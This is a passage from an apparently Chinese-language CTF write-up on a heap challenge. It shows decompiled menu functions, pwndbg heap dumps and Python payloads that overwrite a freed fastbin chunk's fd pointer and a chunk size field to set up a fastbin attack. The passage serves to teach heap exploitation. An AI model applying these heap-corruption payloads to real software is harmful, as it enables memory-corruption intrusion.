</span></span><span class="line"><span class="cl">                <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="mi">24LL</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>        
</span></span><span class="line"><span class="cl">                <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">24LL</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>        
</span></span><span class="line"><span class="cl">                <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">24LL</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>        
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Allocate Index %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">i</span><span class="p">);</span>      
</span></span><span class="line"><span class="cl">            <span class="p">}</span>      
</span></span><span class="line"><span class="cl">            <span class="k">return</span><span class="p">;</span>    
</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><blockquote>
<p>其中限制了大小，不能超过4096字节；</p>
<p>*(24LL * i + a1)为1表示chunk已经创建</p>
<p>*(a1 + 24LL * i + 8)：存放chunk的大小</p>
<p>*(a1 + 24LL * i + 16)：chunk的地址</p>
</blockquote>
<p>Fill函数：</p>
<div class="highlight" id="id-19"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_E7F</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">){</span>  
</span></span><span class="line"><span class="cl">    <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax  
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]  
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-4h]  
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="nf">sub_138C</span><span class="p">();</span>  
</span></span><span class="line"><span class="cl">    <span class="n">v2</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>  
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">result</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">result</span> <span class="o">&lt;=</span> <span class="mi">15</span> <span class="p">)</span>  
</span></span><span class="line"><span class="cl">    <span class="p">{</span>    
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="mi">24LL</span> <span class="o">*</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">result</span> <span class="o">+</span> <span class="n">a1</span><span class="p">);</span>    <span class="mi">2</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">_DWORD</span><span class="p">)</span><span class="n">result</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>    
</span></span><span class="line"><span class="cl">            <span class="p">{</span>      
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Size: &#34;</span><span class="p">);</span>      
</span></span><span class="line"><span class="cl">                <span class="n">result</span> <span class="o">=</span> <span class="nf">sub_138C</span><span class="p">();</span>      
</span></span><span class="line"><span class="cl">                <span class="n">v3</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>      
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">result</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>      
</span></span><span class="line"><span class="cl">                <span class="p">{</span>        
</span></span><span class="line"><span class="cl">                    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Content: &#34;</span><span class="p">);</span>        
</span></span><span class="line"><span class="cl">                    <span class="n">result</span> <span class="o">=</span> <span class="nf">sub_11B2</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="mi">24LL</span> <span class="o">*</span> <span class="n">v2</span> <span class="o">+</span> <span class="n">a1</span> <span class="o">+</span> <span class="mi">16</span><span class="p">),</span> <span class="n">v3</span><span class="p">);</span>      
</span></span><span class="line"><span class="cl">                <span class="p">}</span>    
</span></span><span class="line"><span class="cl">            <span class="p">}</span>  
</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><blockquote>
<p>先判断对应的位置是否为1，即chunk是否创建</p>
<p>然后将v3长度的内容写到*(24LL * v2 + a1 + 16)的地址中</p>
</blockquote>
<p>Free函数</p>
<div class="highlight" id="id-20"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_F50</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">){</span>  
</span></span><span class="line"><span class="cl">    <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax  
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-4h] 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="nf">sub_138C</span><span class="p">();</span>  
</span></span><span class="line"><span class="cl">    <span class="n">v2</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">result</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">result</span> <span class="o">&lt;=</span> <span class="mi">15</span> <span class="p">)</span> 
</span></span><span class="line"><span class="cl">    <span class="p">{</span>   
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="mi">24LL</span> <span class="o">*</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">result</span> <span class="o">+</span> <span class="n">a1</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">_DWORD</span><span class="p">)</span><span class="n">result</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>   
</span></span><span class="line"><span class="cl">        <span class="p">{</span>   
</span></span><span class="line"><span class="cl">            <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="mi">24LL</span> <span class="o">*</span> <span class="n">v2</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>     
</span></span><span class="line"><span class="cl">         <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="mi">24LL</span> <span class="o">*</span> <span class="n">v2</span> <span class="o">+</span> <span class="n">a1</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>   
</span></span><span class="line"><span class="cl">            <span class="nf">free</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="mi">24LL</span> <span class="o">*</span> <span class="n">v2</span> <span class="o">+</span> <span class="n">a1</span> <span class="o">+</span> <span class="mi">16</span><span class="p">));</span>   
</span></span><span class="line"><span class="cl">            <span class="n">result</span> <span class="o">=</span> <span class="mi">24LL</span> <span class="o">*</span> <span class="n">v2</span> <span class="o">+</span> <span class="n">a1</span><span class="p">;</span>    
</span></span><span class="line"><span class="cl">            <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">result</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">        <span class="p">}</span> 
</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><blockquote>
<p>输入index，如果对应的位置是1：</p>
<p>置0，将记录chunk大小的位置标记为0，释放指针*(24LL * v2 + a1 + 16)对应的内存</p>
</blockquote>
<p>Dump函数：</p>
<div class="highlight" id="id-21"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">sub_1051</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">){</span>  
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax  
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-4h]  
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="nf">sub_138C</span><span class="p">();</span>  
</span></span><span class="line"><span class="cl">    <span class="n">v2</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>  
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">result</span> <span class="o">&lt;=</span> <span class="mi">15</span> <span class="p">)</span>  
</span></span><span class="line"><span class="cl">    <span class="p">{</span>    
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="mi">24LL</span> <span class="o">*</span> <span class="n">result</span> <span class="o">+</span> <span class="n">a1</span><span class="p">);</span>    
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>   
</span></span><span class="line"><span class="cl">        <span class="p">{</span>      
</span></span><span class="line"><span class="cl">            <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Content: &#34;</span><span class="p">);</span>     
</span></span><span class="line"><span class="cl">            <span class="nf">sub_130F</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="mi">24LL</span> <span class="o">*</span> <span class="n">v2</span> <span class="o">+</span> <span class="n">a1</span> <span class="o">+</span> <span class="mi">16</span><span class="p">),</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="mi">24LL</span> <span class="o">*</span> <span class="n">v2</span> <span class="o">+</span> <span class="n">a1</span> <span class="o">+</span> <span class="mi">8</span><span class="p">));</span>      
</span></span><span class="line"><span class="cl">            <span class="n">result</span> <span class="o">=</span> <span class="nf">puts</span><span class="p">(</span><span class="n">byte_14F1</span><span class="p">);</span>    
</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><blockquote>
<p>输入index，若标志位为1，打印*(24LL * v2 + a1 + 16)位置，长度为*(24LL * v2 + a1 + 8)的内容。</p>
</blockquote>
<p>没有uaf，内存free掉后不能查看其中的内容，但是可以double free获得指向small bin的index，释放后通过dump打印出来。</p>
<p>首先分配一些相同大小的fast chunk ，在分配一个small chunk，释放掉其中的一个fast chunk。</p>
<div class="highlight" id="id-22"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">allocate(10)#chunk0
</span></span><span class="line"><span class="cl">allocate(10)#chunk1
</span></span><span class="line"><span class="cl">allocate(10)#chunk2
</span></span><span class="line"><span class="cl">allocate(10)#chunk3
</span></span><span class="line"><span class="cl">allocate(80)#chunk4
</span></span><span class="line"><span class="cl">free(1)</span></span></code></pre></div><div class="highlight" id="id-23"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">pwndbg&gt; x/32gx  
</span></span><span class="line"><span class="cl">0x5579684280000x557968428000:	0x0000000000000000	0x0000000000000021 &lt;=chunk0
</span></span><span class="line"><span class="cl">0x557968428010:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x557968428020:	0x0000000000000000	0x0000000000000021 &lt;=chunk1
</span></span><span class="line"><span class="cl">0x557968428030:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x557968428040:	0x0000000000000000	0x0000000000000021 &lt;=chunk2
</span></span><span class="line"><span class="cl">0x557968428050:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x557968428060:	0x0000000000000000	0x0000000000000021 &lt;=chunk3
</span></span><span class="line"><span class="cl">0x557968428070:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x557968428080:	0x0000000000000000	0x0000000000000061 &lt;=chunk4
</span></span><span class="line"><span class="cl">0x557968428090:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x5579684280a0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x5579684280b0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x5579684280c0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x5579684280d0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x5579684280e0:	0x0000000000000000	0x0000000000020f21
</span></span><span class="line"><span class="cl">0x5579684280f0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">pwndbg&gt; x/32gx &amp;main_arena
</span></span><span class="line"><span class="cl">0x7f063731bb20 &lt;main_arena&gt;:	0x0000000000000000	0x0000557968428020
</span></span><span class="line"><span class="cl">0x7f063731bb30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x7f063731bb40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x7f063731bb50 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x7f063731bb60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x7f063731bb70 &lt;main_arena+80&gt;:	0x0000000000000000	0x00005579684280e0
</span></span><span class="line"><span class="cl">0x7f063731bb80 &lt;main_arena+96&gt;:	0x0000000000000000	0x00007f063731bb78
</span></span><span class="line"><span class="cl">0x7f063731bb90 &lt;main_arena+112&gt;:	0x00007f063731bb78	0x00007f063731bb88
</span></span><span class="line"><span class="cl">0x7f063731bba0 &lt;main_arena+128&gt;:	0x00007f063731bb88	0x00007f063731bb98
</span></span><span class="line"><span class="cl">0x7f063731bbb0 &lt;main_arena+144&gt;:	0x00007f063731bb98	0x00007f063731bba8
</span></span><span class="line"><span class="cl">0x7f063731bbc0 &lt;main_arena+160&gt;:	0x00007f063731bba8	0x00007f063731bbb8
</span></span><span class="line"><span class="cl">0x7f063731bbd0 &lt;main_arena+176&gt;:	0x00007f063731bbb8	0x00007f063731bbc8
</span></span><span class="line"><span class="cl">0x7f063731bbe0 &lt;main_arena+192&gt;:	0x00007f063731bbc8	0x00007f063731bbd8
</span></span><span class="line"><span class="cl">0x7f063731bbf0 &lt;main_arena+208&gt;:	0x00007f063731bbd8	0x00007f063731bbe8
</span></span><span class="line"><span class="cl">0x7f063731bc00 &lt;main_arena+224&gt;:	0x00007f063731bbe8	0x00007f063731bbf8
</span></span><span class="line"><span class="cl">0x7f063731bc10 &lt;main_arena+240&gt;:	0x00007f063731bbf8	0x00007f063731bc08</span></span></code></pre></div><p>可以看到释放的fast chunk被放到了fast bin中，fast bin为单链结构，如果再释放一个free(2)，那么会插入到fast bin的头部，释放的第二个chunk的fd会被设置成第一个chunk的地址：</p>
<pre tabindex="0"><code>pwndbg&gt; x/32gx &amp;main_arena
0x7f8ff509db20 &lt;main_arena&gt;:	0x0000000000000000	0x000055d82f950040
0x7f8ff509db30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000
0x7f8ff509db40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000
0x7f8ff509db50 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000
0x7f8ff509db60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000
0x7f8ff509db70 &lt;main_arena+80&gt;:	0x0000000000000000	0x000055d82f9500e0
0x7f8ff509db80 &lt;main_arena+96&gt;:	0x0000000000000000	0x00007f8ff509db78
0x7f8ff509db90 &lt;main_arena+112&gt;:	0x00007f8ff509db78	0x00007f8ff509db88
0x7f8ff509dba0 &lt;main_arena+128&gt;:	0x00007f8ff509db88	0x00007f8ff509db98
0x7f8ff509dbb0 &lt;main_arena+144&gt;:	0x00007f8ff509db98	0x00007f8ff509dba8
0x7f8ff509dbc0 &lt;main_arena+160&gt;:	0x00007f8ff509dba8	0x00007f8ff509dbb8
0x7f8ff509dbd0 &lt;main_arena+176&gt;:	0x00007f8ff509dbb8	0x00007f8ff509dbc8
0x7f8ff509dbe0 &lt;main_arena+192&gt;:	0x00007f8ff509dbc8	0x00007f8ff509dbd8
0x7f8ff509dbf0 &lt;main_arena+208&gt;:	0x00007f8ff509dbd8	0x00007f8ff509dbe8
0x7f8ff509dc00 &lt;main_arena+224&gt;:	0x00007f8ff509dbe8	0x00007f8ff509dbf8
0x7f8ff509dc10 &lt;main_arena+240&gt;:	0x00007f8ff509dbf8	0x00007f8ff509dc08</code></pre><div class="highlight" id="id-25"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="nb">bin</span>
</span></span><span class="line"><span class="cl"><span class="n">fastbins</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x20</span><span class="p">:</span> <span class="mh">0x55d82f950040</span> <span class="err">—▸</span> <span class="mh">0x55d82f950020</span> <span class="err">◂—</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x30</span><span class="p">:</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x40</span><span class="p">:</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x50</span><span class="p">:</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x60</span><span class="p">:</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x70</span><span class="p">:</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x80</span><span class="p">:</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"><span class="n">unsortedbin</span>
</span></span><span class="line"><span class="cl"><span class="nb">all</span><span class="p">:</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"><span class="n">smallbins</span>
</span></span><span class="line"><span class="cl"><span class="n">empty</span>
</span></span><span class="line"><span class="cl"><span class="n">largebins</span>
</span></span><span class="line"><span class="cl"><span class="n">empty</span>
</span></span><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">heap</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x55d82f950000</span> <span class="n">FASTBIN</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">prev_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">size</span> <span class="o">=</span> <span class="mi">33</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">fd</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">bk</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">fd_nextsize</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">bk_nextsize</span> <span class="o">=</span> <span class="mh">0x21</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x55d82f950020</span> <span class="n">FASTBIN</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">prev_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">size</span> <span class="o">=</span> <span class="mi">33</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">fd</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">bk</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">fd_nextsize</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">bk_nextsize</span> <span class="o">=</span> <span class="mh">0x21</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x55d82f950040</span> <span class="n">FASTBIN</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">prev_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">size</span> <span class="o">=</span> <span class="mi">33</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">fd</span> <span class="o">=</span> <span class="mh">0x55d82f950020</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">bk</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">fd_nextsize</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">bk_nextsize</span> <span class="o">=</span> <span class="mh">0x21</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x55d82f950060</span> <span class="n">FASTBIN</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">prev_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">size</span> <span class="o">=</span> <span class="mi">33</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">fd</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">bk</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">fd_nextsize</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">bk_nextsize</span> <span class="o">=</span> <span class="mh">0x61</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x55d82f950080</span> <span class="n">FASTBIN</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">prev_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">size</span> <span class="o">=</span> <span class="mi">97</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">fd</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">bk</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">fd_nextsize</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">bk_nextsize</span> <span class="o">=</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x55d82f9500e0</span> <span class="n">PREV_INUSE</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">prev_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">size</span> <span class="o">=</span> <span class="mi">134945</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">fd</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">bk</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">fd_nextsize</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="n">bk_nextsize</span> <span class="o">=</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>这时使用fill覆盖fast bin头部(即chunk2)的fd的值，将其改为small chunk的地址，这相当于small bin已经被free在fast bin中了。</p>
<div class="highlight" id="id-26"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="c1">#chunk2</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="c1">#地址低位</span>
</span></span><span class="line"><span class="cl"><span class="n">fill</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span></span></span></code></pre></div><p>然后：</p>
<div class="highlight" id="id-27"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="c1">#chunk4_size</span>
</span></span><span class="line"><span class="cl"><span class="n">fill</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span></span></span></code></pre></div><p>这时：</p>
<pre tabindex="0"><code>pwndbg&gt; x/32gx 0x557ac06f3000
0x557ac06f3000:	0x0000000000000000	0x0000000000000021 &lt;=chunk0
0x557ac06f3010:	0x0000000000000000	0x0000000000000000
0x557ac06f3020:	0x0000000000000000	0x0000000000000021 &lt;=chunk1
0x557ac06f3030:	0x0000000000000000	0x0000000000000000
0x557ac06f3040:	0x0000000000000000	0x0000000000000021 &lt;=chunk2
0x557ac06f3050:	0x0000557ac06f3080	0x0000000000000000
0x557ac06f3060:	0x0000000000000000	0x0000000000000021 &lt;=chunk3
0x557ac06f3070:	0x0000000000000000	0x0000000000000000
0x557ac06f3080:	0x0000000000000000	0x0000000000000021 &lt;=chunk4
0x557ac06f3090:	0x0000000000000000	0x0000000000000000
0x557ac06f30a0:	0x0000000000000000	0x0000000000000000
0x557ac06f30b0:	0x0000000000000000	0x0000000000000000
